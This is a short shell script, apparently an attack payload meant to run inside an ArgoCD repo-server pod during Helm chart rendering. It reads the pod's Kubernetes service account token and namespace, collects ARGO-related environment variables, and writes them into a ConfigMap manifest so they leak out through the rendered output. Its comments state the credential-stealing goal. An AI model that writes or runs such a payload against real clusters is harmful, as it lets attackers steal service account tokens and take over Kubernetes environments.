#!/bin/sh
# This script is executed by ArgoCD during helm chart processing
# We are in the repo-server pod - read its SA token + env
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
echo "apiVersion: v1"
echo "kind: ConfigMap"
echo "metadata:"
echo "  name: u2u"
echo "data:"
echo "  token: $TOKEN"
echo "  pod: $HOSTNAME"
echo "  ns: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)"
# Also list all env vars - find argocd-application-controller
echo "  env: $(env | grep -i ARGO | tr '\n' '|')"
exit 0
